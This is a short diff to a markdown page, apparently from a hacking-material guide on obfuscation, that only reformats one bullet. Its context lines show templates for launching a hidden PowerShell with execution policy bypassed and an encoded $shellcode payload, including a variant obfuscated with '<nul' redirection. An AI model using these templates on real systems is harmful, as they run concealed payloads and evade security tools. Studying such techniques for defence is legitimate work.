@@ -106,7 +106,7 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 - String command to obfuscate<br />
 `cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
 
-- Using batch **redirection (<nul)** special character to obfuscate sourcecode.
+- Using batch redirection (**<nul**) special character to obfuscate sourcecode.<br />
 `cmd.exe /c <nul powershell.exe <nul -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
 
 ---
